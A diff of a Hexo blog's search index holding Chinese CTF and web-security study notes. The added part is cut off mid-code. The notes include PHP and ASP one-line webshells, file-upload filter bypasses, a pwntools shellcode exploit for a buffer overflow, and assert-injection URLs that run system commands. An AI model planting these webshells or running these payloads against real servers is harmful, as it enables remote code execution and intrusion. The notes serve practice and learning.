@@ -1,257 +1,64 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title><![CDATA[跟着大佬学的文件上传绕过]]></title>
-      <url>/2018/07/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>一句话木马<br>PHP：<br>    <strong>&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</strong><br>    <strong>&lt;?php @eval($_POST[‘a’]); ?&gt;</strong><br>ASP:<br>    <strong>&lt;%eval request(“Cknife”)%&gt;</strong><br>　<br>ASP.NET:<br>    <strong>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</strong></p>
-<p>文件上传漏洞检测<br>    1、客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名</p>
-<pre><code>2、服务端检测绕过（MIME类型检测）
-绕过：
-    可以通过burp拦包，将原Content-Type类型该为符合要求的image/jpg或者别的类型。
-**基于MIME
-&lt;?php   if (isset($_POST[&apos;Upload&apos;])) {
-     $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
-     $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
-     $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];
-     $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type’];
-        //得到上传文件名的类型，kali里可以用mimetype 文件名来查看
-        //例如：mimetype 1.php    9527.php: application/x-php(php类型)
-        //尽管后缀名改了还是能识别真正的类型（根据内容来检测）
-     $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; //得到文件的大小
- if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){
-        //这里做文件类型和文件大小的比较
-        //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过
- if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {
-                echo &apos;&lt;pre&gt;&apos;;
-                echo &apos;Your image was not uploaded.&apos;;
-                echo &apos;&lt;/pre&gt;&apos;;  } 
-    else {
-                echo &apos;&lt;pre&gt;&apos;;
-                echo $target_path . &apos; succesfully uploaded!&apos;;
-                echo &apos;&lt;/pre&gt;&apos;;  }   }
-    else{
-            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;  } 
-            }   
-?&gt;**        
-
-3、服务端目录路径检测
-绕过：
-    上传时提供存储路劲为image/20160704/可以通过修改为image/20160704/evil.php%00来达到截断目的。后端程序会将该路劲连接为image/20160704/evil.php%00filename.gif00截断导致最终存储的文件名为evil.php
-
-4、服务端文件扩展名检测
-    （1）黑名单检测：接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传
-绕过：
-    ①后缀名大小写绕过 ,例如:将Burpsuite截获的数据包中的文件名    evil.php改evil.Php
-    ②名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等
-    ③特殊文件名绕过（只适用windows，将文件名改为evil.php.或    evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉）。
-    ④0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。
-**
-基于黑名单
-&lt;?php
-    $BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’);
-    //黑名单
-    if (isset($_POST[&quot;submit&quot;])){
-    $name = $_FILES[&apos;file&apos;][&apos;name&apos;]; //接收文件名
-    echo $name;
-    $extension = substr(strrchr($name,&quot;.&quot;),1);
-    //得到扩展名
-    $boo = false;        
-    foreach ($BlackList as $key=&gt;$value){
-    //foreach()函数的意思是BlackList的键值赋值给value
-    //相当于value=BlackList[i]，key=i(数组下标)
-       if ($value==$extension){
-    //迭代判断是否有命中
-        $boo=true;
-        break;//命中之后直接退出循环
-        }
-    }
-    if(!$boo){
-    //如果没有命中，则开始文件上传操作
-        $size=$_FILES[&apos;file&apos;][&apos;size’];
-        //接收文件大小        
-        $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’];
-        //临时路径
-        move_uploaded_file($tmp,$name);
-        //移动临时文件到当前文件目录
-        echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;
-        }
-    else {
-        echo &quot;文件不合法！！&quot;;
-    }    
-}
-</code></pre><p>?&gt;<br><strong><br>        （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名的文件才能上传<br>    绕过：<br>        ①0x00截断绕过<br>        ②解析漏洞绕过<br>        apache解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为php文件，不能解析jpg会向前解析php<br>        IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。<br>        IIS6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型<br>        Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，如evil.jpg/.php，evil.jpg会解析为php的格式
-</strong>    基于白名单<br>    &lt;?php<br>        $WhiteList=array(‘rar’,’jpg’,’png’,’bmp’,’gif’,’jpg’,’doc’);<br>        if (isset($_POST[“submit”])){<br>            $name = $_FILES[‘file’][‘name’];<br>            //接收文件名<br>            $extension = substr(strrchr($name,”.”),1);<br>            //得到扩展名<br>            $boo = false;</p>
-<pre><code>        foreach ($WhiteList as $key=&gt;$value){
-            if ($value==$extension){
-            //迭代判断是否有命中
-            $boo=true;
-            }
-        }
-        if($boo){
-        //如果有命中，则开始文件上传操作
-            $size=$_FILES[&apos;file&apos;][&apos;size’];
-            //接收文件大小
-            $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’];
-            //临时路径
-            move_uploaded_file($tmp,$name);
-            //移动临时文件到当前文件目录
-            echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;
-            }
-        else {
-            echo &quot;文件不合法！！&quot;;
-            }        
-    }
-?&gt;**
-
-5、服务端文件内容检测
-图像类的文件内容检测
-    文件幻数检测（图片头格式检测）
-    jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46
-    gif内容头value= 47 49 46 38 39 61
-    png内容头value= 89 50 4E 47
-绕过：在文件头后加上一句话木马就能绕过
-    ![](文件上传绕过/png图.png)
-</code></pre>]]></content>
-      
-        
-        <tags>
-            
-            <tag> web </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[babypwn3学习经历]]></title>
-      <url>/2017/12/30/babypwn3%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>一:查壳<br>checksec babypwn3<br>显示：</p>
-<p><img src="/2017/12/30/babypwn3学习经历/01.png" alt=""></p>
-<p>没有什么保护<br>二：代码<br>int vulFunc()<br>{<br>char buf; // [sp+0h] [bp-88h]@1<br>char v2; // [sp+7Fh] [bp-9h]@1<br>memset(&amp;buf, 0, 0x80u); //初始化buf的128个字节为0 ①<br>puts(“寮勬淇轰亢涔熶笉浼氬惉浣犵殑璇濈殑锛乗n”);<br>read(0, &amp;buf, 0x100u); //读取数据256个字节保存在buf中<br>if ( v2 == 127 )<br>JUMPOUT(CS, &amp;buf); //当v2=127时会去执行栈上的代码<br>return puts(“鐣ョ暐鐣ワ綖\n”);<br>}<br>.text:080484A6 ; =============== S U B R O U T I N E =======================================<br>.text:080484A6<br>.text:080484A6 ; Attributes: bp-based frame<br>.text:080484A6<br>.text:080484A6 public vulFunc<br>.text:080484A6 vulFunc proc near ; CODE XREF: main+46p<br>.text:080484A6<br>.text:080484A6 buf = byte ptr -88h<br>.text:080484A6 var_9 = byte ptr -9<br>.text:080484A6<br>……<br>.text:08048500 jmp esp<br>三：<br>需要一个shellcode能够system(“/bin/sh”)<br>shellcode=”\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”; //感恩师傅，我可以偷懒<br>1.shellcode+任意字符*(127-shellcode长度)+(v2=127)<br>覆盖v2=127，需要用p32()打包<br>from pwn import<br>shellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;<br>p=remote(‘121.42.189.18 ‘,7003)<br>payload = shellcode+’a’(127-len(shellcode))+p32(127)<br>p.recv()<br>p.sendline(payload)<br>raw_input()<br>p.interactive()<br>2.”jmp esp”作为跳板动态定位shellcode③<br>因为当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。<br>jmp sep地址=08048500 ，需要用p32()打包<br>from pwn import<br>shellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;<br>p=remote(‘121.42.189.18 ‘,7003)<br>jmp_esp=0x8048500<br>payload = ‘a’140+p32(jmp_esp)+shellcode<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br>四：进入shell里<br>cat /tmp/flag ⑤<br>①memset() 函数常用于内存空间初始化<br>void memset(void s,int c,size_t n)<br>开辟的空间s的n个字符初始化为c<br>②JumpOut (“Program” [, “Document”])<br>program:指定的应用程序打开文件Document<br>③可用”jmp esp”作为跳板动态定位shellcode<br>1) 用内存中任意一个”jmp esp”的地址覆盖返回地址<br>2) 函数返回后被重定向去执行内存中jmp esp指令<br>3) 由于函数返回后ESP指向返回地址后，jmp esp执行后，CPU将到栈区函数返回地址之后的地方取指令执行<br>4) shellcode的布置。缓冲区前面一段用任意数据填充，把shellcode放在函数返回地址后面。jmp esp执行完就执行shellcode。<br><a href="http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）" target="_blank" rel="noopener">http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）</a><br><a href="http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）" target="_blank" rel="noopener">http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）</a><br>栈指针esp的一个特性：当函数执行ret指令后，Eip寄存器发生了跳转，但Esp还指向函数形参在栈中的地址。<br>当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。<br>④flag{g54dwqdqw-f43csad-saDWqd23wdasxsaxdFDWEVC}</p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> pwn </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[俄罗斯方块（GG）]]></title>
-      <url>/2017/12/30/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88GG%EF%BC%89/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>①查看元素<br>有一个tetris.js的文件<br>②在线代码美化<br>根据题目分数大于1000000分<br>偷懒查找score</p>
-<p><img src="/2017/12/30/俄罗斯方块（GG）/01.png" alt=""><br>③发现有个 “webqwer” [1] + “100.js”<br>webqwer[1]就是e<br>④<a href="http://218.76.35.75:65380/e100.js" target="_blank" rel="noopener">http://218.76.35.75:65380/e100.js</a><br>又是[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]这种代码<br>⑤在控制台复制粘贴加执行<br>跳出对话框，里面有flag</p>
-<p><img src="/2017/12/30/俄罗斯方块（GG）/02.png" alt=""></p>
-<p>flag{oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk}</p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> web </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[南邮综合题]]></title>
-      <url>/2017/12/30/%E5%8D%97%E9%82%AE%E7%BB%BC%E5%90%88%E9%A2%98/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>1、打开网页是 jother编码 </p>
-<p><img src="/2017/12/30/南邮综合题/01.png" alt=""></p>
-<p>*jother编码：JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。<br>通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的jother是另类的javascript工具<br>一堆+!的东西就用jother解码<br>可以打开谷歌浏览器 按F12<br>然后console将那堆解码的东西复制过去 按回车即可解码<br>2、在谷歌浏览器中的console中复制粘贴代码，回车解码<br>得到1bc29b36f623ba82aaf6724fd3b16718.php<br>将<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a><br>改成<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a></p>
-<p><img src="/2017/12/30/南邮综合题/02.png" alt=""></p>
-<p>显示：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>(▼へ▼メ)<br>给了提示，要看tip<br>3、当前页面<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a><br>查看tip（在network里的headers里查看有个history of bash）</p>
-<p>*history of bash：默认情况下，历史命令是存储在~/.bash_history文件里</p>
-<p><img src="/2017/12/30/南邮综合题/04.png" alt=""></p>
-<p>4、找/.bash_histroy文件<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a><br>找到一个压缩包zip -r flagbak.zip ./*</p>
-<p><img src="/2017/12/30/南邮综合题/05.png" alt=""></p>
-<p>用URL=<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a><br>自动下载，下载完解压找到flag<br>flag is:nctf{bash_history_means_what}</p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> web </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[babyphp]]></title>
-      <url>/2017/12/30/babyphp/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>1、查看源码：</p>
-<p><img src="/2017/12/30/babyphp/01.png" alt=""></p>
-<p>可以发现一共有三个page：home，about，contact<br>还有一个可能存在的page：flag.php<br>2、<a href="http://web.jarvisoj.com:32798/?page=flag.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag.php</a><br>显示：That file doesn’t exist!<br>3、查看about里面有：PHP，GIT,Bootstrap<br>可能有源码泄露，联系到about中有Git，使用GitHack下载源码<br>4、使用GitHash下载源码方法：<br>cmd，并切换到已经下载GitHash-master的py文件目录下<br>python GitHash.py url.git<br>python GitHash.py <a href="http://web.jarvisoj.com:32798/.git" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/.git</a></p>
-<p><img src="/2017/12/30/babyphp/02.png" alt=""></p>
-<p>显示有index.php，about.php，contact.php，flag.php，home.php<br>在GitHash-master的目录下可以找到一个web.jarvisoj.com_32798的文件夹<br>里面有templates和index.php文件<br>*Templates文件夹：该文件夹中存储着常用程序的模板文件，如winword.doc、powerpnt.ppt、excel.xls等。<br>模板就是包含有段落结构、字体样式和页面布局等元素的样式。<br>它决定了文档的基本结构和设置的样式。<br>5、查看了flag.php：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘’;<br>?&gt;<br>6、最后查看index.php：<br>&lt;?php<br>if (isset($_GET[‘page’])){</p>
-<p>$page = $_GET[‘page’];<br>}<br>else {<br>$page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>/<em>PHP assert()<br>assert — 检查一个断言是否为 FALSE<br>PHP 5<br>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7<br>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。<br>这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；<br>在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。<br>断言这个功能应该只被用来调试。<br>你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。<br>断言不应该用于普通运行时操作，类似输入参数的检查。<br>作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。<br>assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。<br>assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。<br>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！</em>/<br>其实真看不懂什么意思 ψ(._.)&gt; 谁来教我<br>php中assert本来是用于调试的，如果assert方法内的代码不为true，则给个Warning提醒。<br>如下面的代码：<br>&lt;?php assert(‘1==2’); ?&gt;<br>执行后会有如下输出： Warning: assert(): Assertion “1==2” failed in D:\green\APMServ5.2.6\www\htdocs\phpinfo.php on line 2 有个assert_option方法可以对assert进行一些控制。<br>7、构造assert()函数会运行接收的语句</p>
-<p><1><a href="http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls</a> templates/;”).’<br>显示：about.phpcontact.phpflag.phphome.phpabout.phpcontact.phpflag.phphome.phpThat file doesn’t exist!</1></p>
-<p><2><a href="http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False</a> and system(‘cat templates/flag.php’);//<br>显示：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}’;<br>?&gt;<br>That file doesn’t exist!<br>‘,’..’)===False根据assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”)<br>‘,’..’)===False为真<br>system(‘cat templates/flag.php’)<br>显示flag.php的内容<br>*system()函数<br>system — 执行外部程序，并且显示输出<br>string system ( string $command [, int &amp;$return_var ] )<br>参数<br>command<br>要执行的命令。<br>return_var<br>如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>返回值<br>成功则返回命令输出的最后一行， 失败则返回 FALSE<br>FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}</2></p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> web </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[checkpass]]></title>
-      <url>/2017/12/30/checkpass/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>查看源码<br>&lt;?php<br>$pass=@$_POST[‘pass’];<br>$pass1=<em>;//被隐藏起来的密码<br>if(isset($pass))<br>{<br>if(@!strcmp($pass,$pass1)){<br>echo “flag:nctf{</em>}”;<br>}else{<br>echo “the pass is wrong!”;<br>}<br>}else{<br>echo “please input pass!”;<br>}<br>?&gt;<br>php的strcmp函数，传入一个array就好了<br>strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>如果传入给出strcmp()的参数是数字呢？<br>$array=[1,2,3];<br>var_dump(strcmp($array,’123’)); //null,在某种意义上null也就是相当于false。<br><a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a><br>使用hackbar插件<br>load URL：<a href="http://chinalover.sinaapp.com/web21/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/index.php</a><br>post data：pass[]=1 //传入一个数组</p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> web </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[在命令行里运行python脚本]]></title>
-      <url>/2017/12/30/%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%87%8C%E8%BF%90%E8%A1%8Cpython%E8%84%9A%E6%9C%AC/</url>
-      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>打开文本编辑器，notepad<br>语言设置成python<br>脚本第一行一定要写上 #! /usr/bin/env python<br>编辑好之后，将文件保存成 .py格式<br>cd 到运行文件所在目录<br>运行python 文件名.py<br>cmd命令行中输入 python<br>把脚本文件拖拽到当前光标位置，回车<br>报错：<br>File ““ , line 1<br>python hello.py<br>SyntaxError：invalid synta<br>原因：Python命令行中，运行Python代码<br>“python hello.py”是一个脚本命令，不是python代码</p>
-]]></content>
-      
-        
-        <tags>
-            
-            <tag> python </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Hello World]]></title>
-      <url>/2017/12/30/hello-world/</url>
-      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
-      
-        
-    </entry>
-    
-  
-  
+<search>
+  <entry>
+    <title><![CDATA[跟着大佬学的文件上传绕过]]></title>
+    <url>%2F2018%2F07%2F07%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;一句话木马PHP： &lt;?php echo shell_exec($_GET[‘a’]);?&gt; &lt;?php @eval($_POST[‘a’]); ?&gt;ASP: &lt;%eval request(“Cknife”)%&gt; ASP.NET: &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt; 文件上传漏洞检测 1、客户端javascript检测（通常在本地检测文件的扩展名） 绕过： ①禁用js ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名 2、服务端检测绕过（MIME类型检测） 绕过： 可以通过burp拦包，将原Content-Type类型该为符合要求的image/jpg或者别的类型。 基于MIME &lt;?php if (isset($_POST[&apos;Upload&apos;])) { $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;; $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]); $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;]; $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type’]; //得到上传文件名的类型，kali里可以用mimetype 文件名来查看 //例如：mimetype 1.php 9527.php: application/x-php(php类型) //尽管后缀名改了还是能识别真正的类型（根据内容来检测） $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; //得到文件的大小 if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){ //这里做文件类型和文件大小的比较 //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过 if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) { echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; } else { echo &apos;&lt;pre&gt;&apos;; echo $target_path . &apos; succesfully uploaded!&apos;; echo &apos;&lt;/pre&gt;&apos;; } } else{ echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } } ?&gt; 3、服务端目录路径检测 绕过： 上传时提供存储路劲为image/20160704/可以通过修改为image/20160704/evil.php%00来达到截断目的。后端程序会将该路劲连接为image/20160704/evil.php%00filename.gif00截断导致最终存储的文件名为evil.php 4、服务端文件扩展名检测 （1）黑名单检测：接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传 绕过： ①后缀名大小写绕过 ,例如:将Burpsuite截获的数据包中的文件名 evil.php改evil.Php ②名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等 ③特殊文件名绕过（只适用windows，将文件名改为evil.php.或 evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉）。 ④0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。 基于黑名单 &lt;?php $BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’); //黑名单 if (isset($_POST[&quot;submit&quot;])){ $name = $_FILES[&apos;file&apos;][&apos;name&apos;]; //接收文件名 echo $name; $extension = substr(strrchr($name,&quot;.&quot;),1); //得到扩展名 $boo = false; foreach ($BlackList as $key=&gt;$value){ //foreach()函数的意思是BlackList的键值赋值给value //相当于value=BlackList[i]，key=i(数组下标) if ($value==$extension){ //迭代判断是否有命中 $boo=true; break;//命中之后直接退出循环 } } if(!$boo){ //如果没有命中，则开始文件上传操作 $size=$_FILES[&apos;file&apos;][&apos;size’]; //接收文件大小 $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’]; //临时路径 move_uploaded_file($tmp,$name); //移动临时文件到当前文件目录 echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name; } else { echo &quot;文件不合法！！&quot;; } } ?&gt; （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名的文件才能上传 绕过： ①0x00截断绕过 ②解析漏洞绕过 apache解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为php文件，不能解析jpg会向前解析php IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。 IIS6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型 Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，如evil.jpg/.php，evil.jpg会解析为php的格式 基于白名单 &lt;?php $WhiteList=array(&apos;rar&apos;,&apos;jpg&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;,&apos;doc’); if (isset($_POST[&quot;submit&quot;])){ $name = $_FILES[&apos;file&apos;][&apos;name’]; //接收文件名 $extension = substr(strrchr($name,&quot;.&quot;),1); //得到扩展名 $boo = false; foreach ($WhiteList as $key=&gt;$value){ if ($value==$extension){ //迭代判断是否有命中 $boo=true; } } if($boo){ //如果有命中，则开始文件上传操作 $size=$_FILES[&apos;file&apos;][&apos;size’]; //接收文件大小 $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’]; //临时路径 move_uploaded_file($tmp,$name); 